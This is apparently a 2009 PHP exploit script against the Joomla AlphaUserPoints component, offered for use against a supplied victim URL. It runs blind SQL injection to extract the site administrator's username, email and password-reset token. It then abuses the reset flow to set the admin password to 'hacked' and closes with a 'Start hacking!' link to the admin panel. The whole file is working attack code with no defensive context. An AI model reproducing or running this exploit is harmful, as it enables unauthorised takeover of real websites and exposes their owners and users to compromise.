<?php
 echo '<h2>Joomla Component AlphaUserPoints SQL Injection Exploit</h2>';
 echo '<h4>jdc 2009</h4>';
 echo '<fieldset><legend>Buffer</legend><div id="update" style="padding:8px;"></div></fieldset>';
 echo '<script type="text/javascript">var update = document.getElementById("update");</script>';
   ini_set( "memory_limit", "128M" );
   ini_set( "max_execution_time", 0 );
   set_time_limit( 0 );
   if( !isset( $_GET['url'] ) ) die( 'Usage: '.$_SERVER['SCRIPT_NAME'].'?url=www.victim.com' );
   $vulnerableFile = "http://".$_GET['url']."/components/com_alphauserpoints/assets/ajax/checkusername.php";
   $url = $vulnerableFile;
 $data = array();
 $admin = '';
 $data['username2points'] = "1' AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 ORDER BY id ASC LIMIT 1 -- '";
 $output = getData();
 echo 'Cheching for exploit...';
 if( !testData( $output ) ) die( 'Failed. Target may have magic quotes on.' );
 echo 'done!<br />';
 if( isset( $_GET['check'] ) ) die( $output );
 echo 'Getting admin username & email (this may take some time)...';
 for( $i=1;$i<250;$i++ )
 {
     $len = strlen( $admin );
     $continue = FALSE;
   for( $j=32; $j<126; $j++ )
   {
       if( $continue ) continue;
       $data = array( 'username2points' => "1' AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 AND ASCII(SUBSTRING(CONCAT(username,0x3a,email),$i,1)) = $j ORDER BY id ASC LIMIT 1 -- '" );
           $output = getData();
           if( testData( $output ) )
           {
             $admin .= chr( $j );
             echo '<script type="text/javascript">update.innerHTML += "'.chr( $j ).'";</script>';
             $continue = TRUE;
           }
           ob_end_flush();
           ob_flush();
           flush();
   }
   if( $len == strlen( $admin ) ) break;
 }
 if( strlen( $admin ) == 0 ) die( 'failed!' );
 echo '<script type="text/javascript">update.innerHTML = "";</script>';
 echo "done!<br />";
 echo "<h4>$admin</h4>";
 $admin = explode( ':', $admin );
 echo "<br />Generating token...";
 $url = "http://".$_GET['url']."/index.php?option=com_user&view=reset&tmpl=component";
 $data = array();
 $token = preg_replace( array( '/\n/', '/(?:.*)name="([a-f0-9]{32})"(?:.*)/m' ), array( '', '$1' ), getData() );
 if( strlen( $token ) != 32 ) die( 'failed!' );
 echo 'done!<br />';
 echo 'Resetting password...';
 $url = "http://".$_GET['url']."/index.php?option=com_user&amp;task=requestreset";
 $data = array( 'email' => $admin[1], $token => 1 );
 getData();
 echo 'done!<br />';
 echo 'Getting Reset Token...';
 $url = $vulnerableFile;
 $data = array();
 $activation = '';
 for( $i=1;$i<100;$i++ )
 {
     $len = strlen( $activation );
     $continue = FALSE;
   for( $j=48; $j<126; $j++ )
   {
       if( $continue ) continue;
       $data = array( 'username2points' => "1' AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 AND ASCII(SUBSTRING(CONCAT(activation),$i,1)) = $j ORDER BY id ASC LIMIT 1 -- '" );
           $output = getData();
           if( testData( $output ) )
           {
             $activation .= chr( $j );
             echo '<script type="text/javascript">update.innerHTML += "'.chr( $j ).'";</script>';
             $continue = TRUE;
           }
           ob_end_flush();
           ob_flush();
           flush();
   }
   if( $len == strlen( $activation ) ) break;
 }
 if( strlen( $activation ) == 0 ) die( 'failed!' );
 echo 'done!<br />';
 echo 'Sending Reset Token...';
 $url = "http://".$_GET['url']."/index.php?option=com_user&view=reset&layout=complete";
 $data = array( 'token' => $activation, $token => 1 );
 getData();
 echo 'done!<br />';
 echo 'Resetting Password to "hacked"...';
 $url = "http://".$_GET['url']."/index.php?option=com_user&view=reset&layout=complete";
 $data = array( 'password1' => 'hacked', 'password2' => 'hacked', $token => 1 );
 getData();
 echo 'done!<br />';
 echo '<hr />';
 echo 'You may now log in as admin using the following credentials:<br />';
 echo '<strong>'.$admin[0].'</strong> / <strong>hacked</strong><br />';
 echo '<a href="http://'.$_GET['url'].'/administrator/">Start hacking!</a>';


 function shutUp( $buffer ) { return false; }
 function testData( $output ) { return preg_match( '/OK/', $output ); }
 function getData()
 {
   global $data, $url;
   ob_start( "shutUp" );
   $ch = curl_init();
   curl_setopt( $ch, CURL_TIMEOUT, 120 );
   curl_setopt( $ch, CURL_RETURNTRANSFER, 0 );
   curl_setopt( $ch, CURLOPT_URL, $url );
   curl_setopt( $ch, CURLOPT_COOKIEFILE, 'aup.cookie.txt' );
   curl_setopt( $ch, CURLOPT_COOKIEJAR, 'aup.cookie.txt' );
   if( count( $data ) > 0 )
   {
           curl_setopt( $ch, CURLOPT_POST, count( $data ) );
           curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $data ) );
   }
   curl_setopt( $ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)" );
   curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
   $result = curl_exec( $ch );
   curl_close( $ch );
   $return = ob_get_contents();
   ob_end_clean();
   return $return;
 }

/* jdc 2009 */
